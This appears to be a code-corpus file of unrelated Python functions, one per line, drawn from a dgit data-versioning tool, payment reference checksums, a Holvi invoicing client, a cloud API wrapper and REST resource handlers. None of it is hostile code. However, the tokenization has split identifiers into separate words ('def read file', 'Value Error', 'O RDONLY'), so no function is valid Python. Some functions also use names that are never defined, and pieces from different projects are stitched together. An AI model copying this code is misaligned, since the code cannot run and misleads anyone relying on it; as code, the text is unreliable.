def add ( self , operator , * args ) : if isinstance ( operator , str ) : op = getattr ( proxops , operator ) ( * args ) elif isinstance ( operator , proxops . Proximal Operator Base Class ) : op = operator else : raise Value Error ( "operator must be a string or a subclass of Proximal Operator" ) self . operators . append ( op ) return self
def evaluate ( self , repo , spec , args ) : status = [ ] # Do we have to any thing at all?  if len ( spec [ 'files' ] ) == 0 : return status with cd ( repo . rootdir ) : rules = None if 'rules-files' in spec and len ( spec [ 'rules-files' ] ) > 0 : rulesfiles = spec [ 'rules-files' ] rules = { } for f in rulesfiles : d = json . loads ( open ( f ) . read ( ) ) rules . update ( d ) elif 'rules' in spec : rules = { 'inline' : spec [ 'rules' ] } if rules is None or len ( rules ) == 0 : print ( "Regression quality validation has been enabled but no rules file has been specified" ) print ( "Example: { 'min-r2': 0.25 }. Put this either in file or in dgit.json" ) raise Invalid Parameters ( "Regression quality checking rules missing" ) files = dict ( [ ( f , open ( f ) . read ( ) ) for f in spec [ 'files' ] ] ) for r in rules : if 'min-r2' not in rules [ r ] : continue minr2 = float ( rules [ r ] [ 'min-r2' ] ) for f in files : match = re . search ( r"R-squared:\s+(\d.\d+)" , files [ f ] ) if match is None : status . append ( { 'target' : f , 'validator' : self . name , 'description' : self . description , 'rules' : r , 'status' : "ERROR" , 'message' : "Invalid model output" } ) else : r2 = match . group ( 1 ) r2 = float ( r2 ) if r2 > minr2 : status . append ( { 'target' : f , 'validator' : self . name , 'description' : self . description , 'rules' : r , 'status' : "OK" , 'message' : "Acceptable R2" } ) else : status . append ( { 'target' : f , 'validator' : self . name , 'description' : self . description , 'rules' : r , 'status' : "ERROR" , 'message' : "R2 is too low" } ) return status
def evaluate ( self , repo , spec , args ) : status = [ ] with cd ( repo . rootdir ) : files = spec . get ( 'files' , [ '*' ] ) resource files = repo . find matching files ( files ) files = glob2 . glob ( "**/*" ) disk files = [ f for f in files if os . path . isfile ( f ) and f != "datapackage.json" ] allfiles = list ( set ( resource files + disk files ) ) allfiles . sort ( ) for f in allfiles : if f in resource files and f in disk files : r = repo . get resource ( f ) coded sha256 = r [ 'sha256' ] computed sha256 = compute sha256 ( f ) if computed sha256 != coded sha256 : status . append ( { 'target' : f , 'rules' : "" , 'validator' : self . name , 'description' : self . description , 'status' : 'ERROR' , 'message' : "Mismatch in checksum on disk and in datapackage.json" } ) else : status . append ( { 'target' : f , 'rules' : "" , 'validator' : self . name , 'description' : self . description , 'status' : 'OK' , 'message' : "" } ) elif f in resource files : status . append ( { 'target' : f , 'rules' : "" , 'validator' : self . name , 'description' : self . description , 'status' : 'ERROR' , 'message' : "In datapackage.json but not in repo" } ) else : status . append ( { 'target' : f , 'rules' : "" , 'validator' : self . name , 'description' : self . description , 'status' : 'ERROR' , 'message' : "In repo but not in datapackage.json" } ) return status
def read file ( self , filename ) : #print("Reading file", filename) try : fh = open ( filename , 'rb' ) table set = any tableset ( fh ) # guess the type... except : #traceback.print exc() # Cannot find the schema. table set = None return table set
def get schema ( self , filename ) : table set = self . read file ( filename ) # Have I been able to read the filename if table set is None : return [ ] # Get the first table as rowset row set = table set . tables [ 0 ] offset , headers = headers guess ( row set . sample ) row set . register processor ( headers processor ( headers ) ) row set . register processor ( offset processor ( offset + 1 ) ) types = type guess ( row set . sample , strict = True ) # Get a sample as well.. sample = next ( row set . sample ) clean = lambda v : str ( v ) if not isinstance ( v , str ) else v schema = [ ] for i , h in enumerate ( headers ) : schema . append ( [ h , str ( types [ i ] ) , clean ( sample [ i ] . value ) ] ) return schema
def int2fin reference ( n ) : checksum = 10 - ( sum ( [ int ( c ) * i for c , i in zip ( str ( n ) [ : : - 1 ] , it . cycle ( ( 7 , 3 , 1 ) ) ) ] ) % 10 ) if checksum == 10 : checksum = 0 return "%s%s" % ( n , checksum )
def iso reference valid char ( c , raise error = True ) : if c in ISO REFERENCE VALID : return True if raise error : raise Value Error ( "'%s' is not in '%s'" % ( c , ISO REFERENCE VALID ) ) return False
def iso reference str2int ( n ) : n = n . upper ( ) numbers = [ ] for c in n : iso reference valid char ( c ) if c in ISO REFERENCE VALID NUMERIC : numbers . append ( c ) else : numbers . append ( str ( iso reference char2int ( c ) ) ) return int ( '' . join ( numbers ) )
def iso reference isvalid ( ref ) : ref = str ( ref ) cs source = ref [ 4 : ] + ref [ : 4 ] return ( iso reference str2int ( cs source ) % 97 ) == 1
def add file normal ( f , targetdir , generator , script , source ) : basename = os . path . basename ( f ) if targetdir != "." : relativepath = os . path . join ( targetdir , basename ) else : relativepath = basename relpath = os . path . relpath ( f , os . getcwd ( ) ) filetype = 'data' if script : filetype = 'script' if generator : filetype = 'generator' update = Ordered Dict ( [ ( 'type' , filetype ) , ( 'generator' , generator ) , ( 'relativepath' , relativepath ) , ( 'content' , "" ) , ( 'source' , source ) , ( 'localfullpath' , f ) , ( 'localrelativepath' , relpath ) ] ) update = annotate record ( update ) return ( basename , update )
def extract files ( filename , includes ) : # Load the execution strace log lines = open ( filename ) . readlines ( ) # Extract only open files - whether for read or write. You often # want to capture the json/ini configuration file as well files = { } lines = [ l . strip ( ) for l in lines if 'open(' in l ] for l in lines : # Check both these formats... # 20826 open("/usr/lib/locale/locale-archive", O RDONLY|O CLOEXEC) = 3 #[28940] access(b'/etc/ld.so.nohwcap', F OK)      = -2 (No such file or directory) matchedfile = re . search ( 'open\([b]["\'](.+?)["\']' , l ) if matchedfile is None : matchedfile = re . search ( 'open\("(.+?)\"' , l ) if matchedfile is None : continue matchedfile = matchedfile . group ( 1 ) if os . path . exists ( matchedfile ) and os . path . isfile ( matchedfile ) : #print("Looking at ", matchedfile) # Check what action is being performed on these action = 'input' if 'O RDONLY' in l else 'output' matchedfile = os . path . relpath ( matchedfile , "." ) #print("Matched file's relative path", matchedfile) for i in includes : if fnmatch . fnmatch ( matchedfile , i ) : # Exclude python libraries if 'site-packages' in matchedfile : continue if matchedfile not in files : files [ matchedfile ] = [ action ] else : if action not in files [ matchedfile ] : files [ matchedfile ] . append ( action ) # A single file may be opened and closed multiple times if len ( files ) == 0 : print ( "No input or output files found that match pattern" ) return [ ] print ( 'We captured files that matched the pattern you specified.' ) print ( 'Please select files to keep (press ENTER)' ) # Let the user have the final say on which files must be included. filenames = list ( files . keys ( ) ) filenames . sort ( ) with tempfile . Named Temporary File ( suffix = ".tmp" ) as temp : temp . write ( yaml . dump ( filenames , default flow style = False ) . encode ( 'utf-8' ) ) temp . flush ( ) EDITOR = os . environ . get ( 'EDITOR' , '/usr/bin/vi' ) subprocess . call ( "%s %s" % ( EDITOR , temp . name ) , shell = True ) temp . seek ( 0 ) data = temp . read ( ) selected = yaml . load ( data ) print ( "You selected" , len ( selected ) , "file(s)" ) if len ( selected ) == 0 : return [ ] # Get the action corresponding to the selected files filenames = [ f for f in filenames if f in selected ] # Now we know the list of files. Where should they go? print ( 'Please select target locations for the various directories we found' ) print ( 'Please make sure you do not delete any rows or edit the keys.' ) input ( '(press ENTER)' ) prefixes = { } for f in filenames : dirname = os . path . dirname ( f ) if dirname == "" : dirname = "." prefixes [ dirname ] = dirname while True : with tempfile . Named Temporary File ( suffix = ".tmp" ) as temp : temp . write ( yaml . dump ( prefixes , default flow style = False ) . encode ( 'utf-8' ) ) temp . flush ( ) EDITOR = os . environ . get ( 'EDITOR' , '/usr/bin/vi' ) subprocess . call ( "%s %s" % ( EDITOR , temp . name ) , shell = True ) temp . seek ( 0 ) data = temp . read ( ) try : revised = yaml . load ( data ) except Exception as e : revised = { } #print(list(revised.keys())) #print(list(prefixes.keys())) if set ( list ( revised . keys ( ) ) ) == set ( list ( prefixes . keys ( ) ) ) : prefixes = revised break else : print ( "Could not process edited file. Either some rows are missing or entry has YAML syntax errors" ) input ( "Press ENTER to continue" ) # Add the root directory back if "." in prefixes : prefixes [ "" ] = prefixes [ "." ] result = [ ] ts = datetime . now ( ) . isoformat ( ) for f in filenames : relativepath = prefixes [ os . path . dirname ( f ) ] if relativepath == "." : relativepath = os . path . basename ( f ) else : relativepath = os . path . join ( relativepath , os . path . basename ( f ) ) result . append ( Ordered Dict ( [ ( 'relativepath' , relativepath ) , ( 'type' , 'run-output' ) , ( 'actions' , files [ f ] ) , ( 'mimetypes' , mimetypes . guess type ( f ) [ 0 ] ) , ( 'content' , open ( f ) . read ( 512 ) ) , ( 'sha256' , compute sha256 ( f ) ) , ( 'ts' , ts ) , ( 'localrelativepath' , os . path . relpath ( f , "." ) ) , ( 'localfullpath' , os . path . abspath ( f ) ) , ] ) ) print ( json . dumps ( result , indent = 4 ) ) return result
def run executable ( repo , args , includes ) : # Get platform information mgr = plugins get mgr ( ) repomgr = mgr . get ( what = 'instrumentation' , name = 'platform' ) platform metadata = repomgr . get metadata ( ) print ( "Obtaining Commit Information" ) ( executable , commiturl ) = find executable commitpath ( repo , args ) # Create a local directory tmpdir = tempfile . mkdtemp ( ) # Construct the strace command print ( "Running the command" ) strace filename = os . path . join ( tmpdir , 'strace.out.txt' ) cmd = [ "strace.py" , "-f" , "-o" , strace filename , "-s" , "1024" , "-q" , "--" ] + args # Run the command p = subprocess . Popen ( cmd , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) out , err = p . communicate ( ) # Capture the stdout/stderr stdout = os . path . join ( tmpdir , 'stdout.log.txt' ) with open ( stdout , 'w' ) as fd : fd . write ( out . decode ( 'utf-8' ) ) stderr = os . path . join ( tmpdir , 'stderr.log.txt' ) with open ( stderr , 'w' ) as fd : fd . write ( err . decode ( 'utf-8' ) ) # Check the strace output files = extract files ( strace filename , includes ) # Now insert the execution metadata execution metadata = { 'likelyexecutable' : executable , 'commitpath' : commiturl , 'args' : args , } execution metadata . update ( platform metadata ) for i in range ( len ( files ) ) : files [ i ] [ 'execution metadata' ] = execution metadata return files
def find matching files ( self , includes ) : if len ( includes ) == 0 : return [ ] files = [ f [ 'relativepath' ] for f in self . package [ 'resources' ] ] includes = r'|' . join ( [ fnmatch . translate ( x ) for x in includes ] ) # Match both the file name as well the path.. files = [ f for f in files if re . match ( includes , os . path . basename ( f ) ) ] + [ f for f in files if re . match ( includes , f ) ] files = list ( set ( files ) ) return files
def run ( self , cmd , * args ) : if self . manager is None : raise Exception ( "Fatal internal error: Missing repository manager" ) if cmd not in dir ( self . manager ) : raise Exception ( "Fatal internal error: Invalid command {} being run" . format ( cmd ) ) func = getattr ( self . manager , cmd ) repo = self return func ( repo , * args )
def get resource ( self , p ) : for r in self . package [ 'resources' ] : if r [ 'relativepath' ] == p : r [ 'localfullpath' ] = os . path . join ( self . rootdir , p ) return r raise Exception ( "Invalid path" )
def lookup ( self , username = None , reponame = None , key = None ) : if key is None : key = self . key ( username , reponame ) if key not in self . repos : raise Unknown Repository ( ) return self . repos [ key ]
def rootdir ( self , username , reponame , create = True ) : path = os . path . join ( self . workspace , 'datasets' , username , reponame ) if create : try : os . makedirs ( path ) except : pass return path
def add ( self , repo ) : key = self . key ( repo . username , repo . reponame ) repo . key = key self . repos [ key ] = repo return key
def lookup ( username , reponame ) : mgr = plugins get mgr ( ) # XXX This should be generalized to all repo managers. repomgr = mgr . get ( what = 'repomanager' , name = 'git' ) repo = repomgr . lookup ( username = username , reponame = reponame ) return repo
def datapackage exists ( repo ) : datapath = os . path . join ( repo . rootdir , "datapackage.json" ) return os . path . exists ( datapath )
def bootstrap datapackage ( repo , force = False , options = None , noinput = False ) : print ( "Bootstrapping datapackage" ) # get the directory tsprefix = datetime . now ( ) . date ( ) . isoformat ( ) # Initial data package json package = Ordered Dict ( [ ( 'title' , '' ) , ( 'description' , '' ) , ( 'username' , repo . username ) , ( 'reponame' , repo . reponame ) , ( 'name' , str ( repo ) ) , ( 'title' , "" ) , ( 'description' , "" ) , ( 'keywords' , [ ] ) , ( 'resources' , [ ] ) , ( 'creator' , getpass . getuser ( ) ) , ( 'createdat' , datetime . now ( ) . isoformat ( ) ) , ( 'remote-url' , repo . remoteurl ) ] ) if options is not None : package [ 'title' ] = options [ 'title' ] package [ 'description' ] = options [ 'description' ] else : if noinput : raise Incomplete Parameters ( "Option field with title and description" ) for var in [ 'title' , 'description' ] : value = '' while value in [ '' , None ] : value = input ( 'Your Repo ' + var . title ( ) + ": " ) if len ( value ) == 0 : print ( "{} cannot be empty. Please re-enter." . format ( var . title ( ) ) ) package [ var ] = value # Now store the package... ( handle , filename ) = tempfile . mkstemp ( ) with open ( filename , 'w' ) as fd : fd . write ( json . dumps ( package , indent = 4 ) ) repo . package = package return filename
def annotate metadata data ( repo , task , patterns = [ "*" ] , size = 0 ) : mgr = plugins get mgr ( ) keys = mgr . search ( 'representation' ) [ 'representation' ] representations = [ mgr . get by key ( 'representation' , k ) for k in keys ] matching files = repo . find matching files ( patterns ) package = repo . package rootdir = repo . rootdir files = package [ 'resources' ] for f in files : relativepath = f [ 'relativepath' ] if relativepath in matching files : path = os . path . join ( rootdir , relativepath ) if task == 'preview' : print ( "Adding preview for " , relativepath ) f [ 'content' ] = open ( path ) . read ( ) [ : size ] elif task == 'schema' : for r in representations : if r . can process ( path ) : print ( "Adding schema for " , path ) f [ 'schema' ] = r . get schema ( path ) break
def annotate metadata code ( repo , files ) : package = repo . package package [ 'code' ] = [ ] for p in files : matching files = glob2 . glob ( "**/{}" . format ( p ) ) for f in matching files : absf = os . path . abspath ( f ) print ( "Add commit data for {}" . format ( f ) ) package [ 'code' ] . append ( Ordered Dict ( [ ( 'script' , f ) , ( 'permalink' , repo . manager . permalink ( repo , absf ) ) , ( 'mimetypes' , mimetypes . guess type ( absf ) [ 0 ] ) , ( 'sha256' , compute sha256 ( absf ) ) ] ) )
def annotate metadata action ( repo ) : package = repo . package print ( "Including history of actions" ) with cd ( repo . rootdir ) : filename = ".dgit/log.json" if os . path . exists ( filename ) : history = open ( filename ) . readlines ( ) actions = [ ] for a in history : try : a = json . loads ( a ) for x in [ 'code' ] : if x not in a or a [ x ] == None : a [ x ] = "..." actions . append ( a ) except : pass package [ 'actions' ] = actions
def annotate metadata platform ( repo ) : print ( "Added platform information" ) package = repo . package mgr = plugins get mgr ( ) repomgr = mgr . get ( what = 'instrumentation' , name = 'platform' ) package [ 'platform' ] = repomgr . get metadata ( )
def annotate metadata dependencies ( repo ) : options = repo . options if 'dependencies' not in options : print ( "No dependencies" ) return [ ] repos = [ ] dependent repos = options [ 'dependencies' ] for d in dependent repos : if "/" not in d : print ( "Invalid dependency specification" ) ( username , reponame ) = d . split ( "/" ) try : repos . append ( repo . manager . lookup ( username , reponame ) ) except : print ( "Repository does not exist. Please create one" , d ) package = repo . package package [ 'dependencies' ] = [ ] for r in repos : package [ 'dependencies' ] . append ( { 'username' : r . username , 'reponame' : r . reponame , } )
def discover all plugins ( self ) : for v in pkg resources . iter entry points ( 'dgit.plugins' ) : m = v . load ( ) m . setup ( self )
def search ( self , what , name = None , version = None ) : filtered = { } # The search may for a scan (what is None) or if what is None : whats = list ( self . plugins . keys ( ) ) elif what is not None : if what not in self . plugins : raise Exception ( "Unknown class of plugins" ) whats = [ what ] for what in whats : if what not in filtered : filtered [ what ] = [ ] for key in self . plugins [ what ] . keys ( ) : ( k name , k version ) = key if name is not None and k name != name : continue if version is not None and k version != version : continue if self . plugins [ what ] [ key ] . enable == 'n' : continue filtered [ what ] . append ( key ) # print(filtered) return filtered
def gather configs ( self ) : configs = [ ] for what in self . order : for key in self . plugins [ what ] : mgr = self . plugins [ what ] [ key ] c = mgr . config ( what = 'get' ) if c is not None : c . update ( { 'description' : mgr . description } ) # print("Gathering configuration from ", c) configs . append ( c ) return configs
def update configs ( self , config ) : for what in self . plugins : # backend, repo etc. for key in self . plugins [ what ] : # s3, filesystem etc. # print("Updating configuration of", what, key) self . plugins [ what ] [ key ] . config ( what = 'set' , params = config ) return
def instantiate ( repo , validator name = None , filename = None , rulesfiles = None ) : default validators = repo . options . get ( 'validator' , { } ) validators = { } if validator name is not None : # Handle the case validator is specified.. if validator name in default validators : validators = { validator name : default validators [ validator name ] } else : validators = { validator name : { 'files' : [ ] , 'rules' : { } , 'rules-files' : [ ] } } else : validators = default validators #========================================= # Insert the file names #========================================= if filename is not None : matching files = repo . find matching files ( [ filename ] ) if len ( matching files ) == 0 : print ( "Filename could not be found" , filename ) raise Exception ( "Invalid filename pattern" ) for v in validators : validators [ v ] [ 'files' ] = matching files else : # Instantiate the files from the patterns specified for v in validators : if 'files' not in validators [ v ] : validators [ v ] [ 'files' ] = [ ] elif len ( validators [ v ] [ 'files' ] ) > 0 : matching files = repo . find matching files ( validators [ v ] [ 'files' ] ) validators [ v ] [ 'files' ] = matching files #========================================= # Insert the rules files.. #========================================= if rulesfiles is not None : # Command lines... matching files = repo . find matching files ( [ rulesfiles ] ) if len ( matching files ) == 0 : print ( "Could not find matching rules files ({}) for {}" . format ( rulesfiles , v ) ) raise Exception ( "Invalid rules" ) for v in validators : validators [ v ] [ 'rules-files' ] = matching files else : # Instantiate the files from the patterns specified for v in validators : if 'rules-files' not in validators [ v ] : validators [ v ] [ 'rules-files' ] = [ ] else : rulesfiles = validators [ v ] [ 'rules-files' ] matching files = repo . find matching files ( rulesfiles ) validators [ v ] [ 'rules-files' ] = matching files return validators
def url is valid ( self , url ) : # Check if the file system path exists... if url . startswith ( "file://" ) : url = url . replace ( "file://" , "" ) return os . path . exists ( url )
def find executable files ( ) : files = glob . glob ( "*" ) + glob . glob ( "*/*" ) + glob . glob ( '*/*/*' ) files = filter ( lambda f : os . path . isfile ( f ) , files ) executable = stat . S IEXEC | stat . S IXGRP | stat . S IXOTH final = [ ] for filename in files : if os . path . isfile ( filename ) : st = os . stat ( filename ) mode = st . st mode if mode & executable : final . append ( filename ) if len ( final ) > 5 : break return final
def get files to commit ( autooptions ) : workingdir = autooptions [ 'working-directory' ] includes = autooptions [ 'track' ] [ 'includes' ] excludes = autooptions [ 'track' ] [ 'excludes' ] # transform glob patterns to regular expressions # print("Includes ", includes)  includes = r'|' . join ( [ fnmatch . translate ( x ) for x in includes ] ) excludes = r'|' . join ( [ fnmatch . translate ( x ) for x in excludes ] ) or r'$.' matched files = [ ] for root , dirs , files in os . walk ( workingdir ) : # print("Looking at ", files) # exclude dirs # dirs[:] = [os.path.join(root, d) for d in dirs] dirs [ : ] = [ d for d in dirs if not re . match ( excludes , d ) ] # exclude/include files files = [ f for f in files if not re . match ( excludes , f ) ] #print("Files after excludes", files) #print(includes)  files = [ f for f in files if re . match ( includes , f ) ] #print("Files after includes", files)  files = [ os . path . join ( root , f ) for f in files ] matched files . extend ( files ) return matched files
def auto add ( repo , autooptions , files ) : # Get the mappings and keys. mapping = { "." : "" } if ( ( 'import' in autooptions ) and ( 'directory-mapping' in autooptions [ 'import' ] ) ) : mapping = autooptions [ 'import' ] [ 'directory-mapping' ] # Apply the longest prefix first... keys = mapping . keys ( ) keys = sorted ( keys , key = lambda k : len ( k ) , reverse = True ) count = 0 params = [ ] for f in files : # Find the destination relativepath = f for k in keys : v = mapping [ k ] if f . startswith ( k + "/" ) : #print("Replacing ", k) relativepath = f . replace ( k + "/" , v ) break # Now add to repository count += files add ( repo = repo , args = [ f ] , targetdir = os . path . dirname ( relativepath ) ) return count
def instantiate ( repo , name = None , filename = None ) : default transformers = repo . options . get ( 'transformer' , { } ) # If a name is specified, then lookup the options from dgit.json # if specfied. Otherwise it is initialized to an empty list of # files. transformers = { } if name is not None : # Handle the case generator is specified.. if name in default transformers : transformers = { name : default transformers [ name ] } else : transformers = { name : { 'files' : [ ] , } } else : transformers = default transformers #========================================= # Map the filename patterns to list of files #========================================= # Instantiate the files from the patterns specified input matching files = None if filename is not None : input matching files = repo . find matching files ( [ filename ] ) for t in transformers : for k in transformers [ t ] : if "files" not in k : continue if k == "files" and input matching files is not None : # Use the files specified on the command line.. transformers [ t ] [ k ] = input matching files else : # Try to match the specification if transformers [ t ] [ k ] is None or len ( transformers [ t ] [ k ] ) == 0 : transformers [ t ] [ k ] = [ ] else : matching files = repo . find matching files ( transformers [ t ] [ k ] ) transformers [ t ] [ k ] = matching files return transformers
def delete ( self , repo , args = [ ] ) : result = None with cd ( repo . rootdir ) : try : cmd = [ 'rm' ] + list ( args ) result = { 'status' : 'success' , 'message' : self . run ( cmd ) } except Exception as e : result = { 'status' : 'error' , 'message' : str ( e ) } # print(result) return result
def permalink ( self , repo , path ) : if not os . path . exists ( path ) : # print("Path does not exist", path) return ( None , None ) # Get this directory cwd = os . getcwd ( ) # Find the root of the repo and cd into that directory.. if os . path . isfile ( path ) : os . chdir ( os . path . dirname ( path ) ) rootdir = self . run ( [ "rev-parse" , "--show-toplevel" ] ) if "fatal" in rootdir : # print("fatal", rootdir) return ( None , None ) os . chdir ( rootdir ) # print("Rootdir = ", rootdir) # Now find relative path relpath = os . path . relpath ( path , rootdir ) # print("relpath = ", relpath) # Get the last commit for this file #3764cc2600b221ac7d7497de3d0dbcb4cffa2914 sha1 = self . run ( [ "log" , "-n" , "1" , "--format=format:%H" , relpath ] ) # print("sha1 = ", sha1) # Get the repo URL #git@gitlab.com:pingali/simple-regression.git #https://gitlab.com/kanban demo/test project.git remoteurl = self . run ( [ "config" , "--get" , "remote.origin.url" ] ) # print("remoteurl = ", remoteurl) # Go back to the original directory... os . chdir ( cwd ) # Now match it against two possible formats of the remote url # Examples #https://help.github.com/articles/getting-permanent-links-to-files/ #https://gitlab.com/pingali/simple-regression/blob/3764cc2600b221ac7d7497de3d0dbcb4cffa2914/model.py #https://gitlab.com/kanban demo/test project/blob/b004677c23b3a31eb7b5588a5194857b2c8b2b95/README.md m = re . search ( '^git@([^:\/]+):([^/]+)/([^/]+)' , remoteurl ) if m is None : m = re . search ( '^https://([^:/]+)/([^/]+)/([^/]+)' , remoteurl ) if m is not None : domain = m . group ( 1 ) username = m . group ( 2 ) project = m . group ( 3 ) if project . endswith ( ".git" ) : project = project [ : - 4 ] permalink = "https://{}/{}/{}/blob/{}/{}" . format ( domain , username , project , sha1 , relpath ) # print("permalink = ", permalink) return ( relpath , permalink ) else : return ( None , None )
def add files ( self , repo , files ) : rootdir = repo . rootdir for f in files : relativepath = f [ 'relativepath' ] sourcepath = f [ 'localfullpath' ] if sourcepath is None : # This can happen if the relative path is a URL continue # # Prepare the target path targetpath = os . path . join ( rootdir , relativepath ) try : os . makedirs ( os . path . dirname ( targetpath ) ) except : pass # print(sourcepath," => ", targetpath) print ( "Updating: {}" . format ( relativepath ) ) shutil . copyfile ( sourcepath , targetpath ) with cd ( repo . rootdir ) : self . run ( [ 'add' , relativepath ] )
def to holvi dict ( self ) : self . jsondata [ "items" ] = [ ] for item in self . items : self . jsondata [ "items" ] . append ( item . to holvi dict ( ) ) self . jsondata [ "issue date" ] = self . issue date . isoformat ( ) self . jsondata [ "due date" ] = self . due date . isoformat ( ) self . jsondata [ "receiver" ] = self . receiver . to holvi dict ( ) return { k : v for ( k , v ) in self . jsondata . items ( ) if k in self . valid keys }
def save ( self ) : if self . code : raise Holvi Error ( "Orders cannot be updated" ) send json = self . to holvi dict ( ) send json . update ( { 'pool' : self . api . connection . pool } ) url = six . u ( self . api . base url + "order/" ) stat = self . api . connection . make post ( url , send json ) code = stat [ "details uri" ] . split ( "/" ) [ - 2 ] # Maybe slightly ugly but I don't want to basically reimplement all but uri formation of the api method return ( stat [ "checkout uri" ] , self . api . get order ( code ) )
def init repo ( self , gitdir ) : hooksdir = os . path . join ( gitdir , 'hooks' ) content = postreceive template % { 'client' : self . client , 'bucket' : self . bucket , 's3cfg' : self . s3cfg , 'prefix' : self . prefix } postrecv filename = os . path . join ( hooksdir , 'post-receive' ) with open ( postrecv filename , 'w' ) as fd : fd . write ( content ) self . make hook executable ( postrecv filename ) print ( "Wrote to" , postrecv filename )
def compute sha256 ( filename ) : try : h = sha256 ( ) fd = open ( filename , 'rb' ) while True : buf = fd . read ( 0x1000000 ) if buf in [ None , "" ] : break h . update ( buf . encode ( 'utf-8' ) ) fd . close ( ) return h . hexdigest ( ) except : output = run ( [ "sha256sum" , "-b" , filename ] ) return output . split ( " " ) [ 0 ]
def run ( cmd ) : cmd = [ pipes . quote ( c ) for c in cmd ] cmd = " " . join ( cmd ) cmd += "; exit 0" # print("Running {} in {}".format(cmd, os.getcwd())) try : output = subprocess . check output ( cmd , stderr = subprocess . STDOUT , shell = True ) except subprocess . Called Process Error as e : output = e . output output = output . decode ( 'utf-8' ) output = output . strip ( ) return output
def get tree ( gitdir = "." ) : cmd = [ "git" , "log" , "--all" , "--branches" , '--pretty=format:{  "commit": "%H",  "abbreviated commit": "%h",  "tree": "%T",  "abbreviated tree": "%t",  "parent": "%P",  "abbreviated parent": "%p",  "refs": "%d",  "encoding": "%e",  "subject": "%s", "sanitized subject line": "%f",  "commit notes": "",  "author": {    "name": "%a N",    "email": "%a E",    "date": "%ai"  },  "commiter": {    "name": "%c N",    "email": "%c E",    "date": "%ci"  }},' ] output = run ( cmd ) lines = output . split ( "\n" ) content = "" history = [ ] for l in lines : try : revisedcontent = content + l if revisedcontent . count ( '"' ) % 2 == 0 : j = json . loads ( revisedcontent [ : - 1 ] ) if "Notes added by" in j [ 'subject' ] : content = "" continue history . append ( j ) content = "" else : content = revisedcontent except Exception as e : print ( "Error while parsing record" ) print ( revisedcontent ) content = "" # Order by time. First commit first... history . reverse ( ) # changes = get change ( ) for i in range ( len ( history ) ) : abbrev commit = history [ i ] [ 'abbreviated commit' ] if abbrev commit not in changes : raise Exception ( "Missing changes for " + abbrev commit ) history [ i ] [ 'changes' ] = changes [ abbrev commit ] [ 'changes' ] return history
def get diffs ( history ) : # First get all possible representations mgr = plugins get mgr ( ) keys = mgr . search ( 'representation' ) [ 'representation' ] representations = [ mgr . get by key ( 'representation' , k ) for k in keys ] for i in range ( len ( history ) ) : if i + 1 > len ( history ) - 1 : continue prev = history [ i ] curr = history [ i + 1 ] #print(prev['subject'], "==>", curr['subject']) #print(curr['changes']) for c in curr [ 'changes' ] : path = c [ 'path' ] # Skip the metadata file if c [ 'path' ] . endswith ( 'datapackage.json' ) : continue # Find a handler for this kind of file... handler = None for r in representations : if r . can process ( path ) : handler = r break if handler is None : continue # print(path, "being handled by", handler) v1 hex = prev [ 'commit' ] v2 hex = curr [ 'commit' ] temp1 = tempfile . mkdtemp ( prefix = "dgit-diff-" ) try : for h in [ v1 hex , v2 hex ] : filename = '{}/{}/checkout.tar' . format ( temp1 , h ) try : os . makedirs ( os . path . dirname ( filename ) ) except : pass extractcmd = [ 'git' , 'archive' , '-o' , filename , h , path ] output = run ( extractcmd ) if 'fatal' in output : raise Exception ( "File not present in commit" ) with cd ( os . path . dirname ( filename ) ) : cmd = [ 'tar' , 'xvf' , 'checkout.tar' ] output = run ( cmd ) if 'fatal' in output : print ( "Cleaning up - fatal 1" , temp1 ) shutil . rmtree ( temp1 ) continue # Check to make sure that  path1 = os . path . join ( temp1 , v1 hex , path ) path2 = os . path . join ( temp1 , v2 hex , path ) if not os . path . exists ( path1 ) or not os . path . exists ( path2 ) : # print("One of the two output files is missing")  shutil . rmtree ( temp1 ) continue #print(path1, path2)  # Now call the handler diff = handler . get diff ( path1 , path2 ) # print("Inserting diff", diff) c [ 'diff' ] = diff except Exception as e : #traceback.print exc()  #print("Cleaning up - Exception ", temp1) shutil . rmtree ( temp1 )
def set path ( self , path ) : import os . path self . path = os . path . abspath ( path ) self . dirname = os . path . dirname ( path ) self . basename = os . path . basename ( path )
def images ( self ) : tifs = pattern ( self . image path , extension = 'tif' ) pngs = pattern ( self . image path , extension = 'png' ) imgs = [ ] imgs . extend ( glob ( tifs ) ) imgs . extend ( glob ( pngs ) ) return imgs
def scanning template ( self ) : tmpl = glob ( pattern ( self . path , additional data , scanning template , extension = '*.xml' ) ) if tmpl : return tmpl [ 0 ] else : return ''
def wait ( self ) : interval seconds = 5 while True : actions = self . actions ( ) slept = False for a in actions : if a [ 'status' ] == 'in-progress' : # n.b. gevent will monkey patch time . sleep ( interval seconds ) slept = True break if not slept : break
def format parameters ( self , * * kwargs ) : req data = { } for k , v in kwargs . items ( ) : if isinstance ( v , ( list , tuple ) ) : k = k + '[]' req data [ k ] = v return req data
def format request url ( self , resource , * args ) : return '/' . join ( ( self . api url , self . api version , resource ) + tuple ( str ( x ) for x in args ) )
def list ( self , url components = ( ) ) : resp = self . get ( url components ) return resp . get ( self . result key , [ ] )
def get ( self , id , * * kwargs ) : return ( super ( Mutable Collection , self ) . get ( ( id , ) , * * kwargs ) . get ( self . singular , None ) )
def get ( self , id , * * kwargs ) : return super ( Domain Records , self ) . get ( id , * * kwargs )
def chop ( list , n ) : # could look into itertools also, might be implemented there size = len ( list ) each = size // n if each == 0 : return [ list ] chopped = [ ] for i in range ( n ) : start = i * each end = ( i + 1 ) * each if i == ( n - 1 ) : # make sure we get all items, let last worker do a litte more end = size chopped . append ( list [ start : end ] ) return chopped
def allowed operations ( self ) : if self . slug is not None : return self . meta . detail allowed operations return self . meta . list allowed operations
def assert operations ( self , * args ) : if not set ( args ) . issubset ( self . allowed operations ) : raise http . exceptions . Forbidden ( )
def make response ( self , data = None ) : if data is not None : # Prepare the data for transmission. data = self . prepare ( data ) # Encode the data using a desired encoder. self . response . write ( data , serialize = True )
def get ( self , request , response ) : # Ensure we're allowed to read the resource. self . assert operations ( 'read' ) # Delegate to `read` to retrieve the items. items = self . read ( ) # if self.slug is not None and not items: #     # Requested a specific resource but nothing is returned. #     # Attempt to resolve by changing what we understand as #     # a slug to a path. #     self.path = self.path + self.slug if self.path else self.slug #     self.slug = None #     # Attempt to retreive the resource again. #     items = self.read() # Ensure that if we have a slug and still no items that a 404 # is rasied appropriately. if not items : raise http . exceptions . Not Found ( ) if ( isinstance ( items , Iterable ) and not isinstance ( items , six . string types ) ) and items : # Paginate over the collection. items = pagination . paginate ( self . request , self . response , items ) # Build the response object. self . make response ( items )
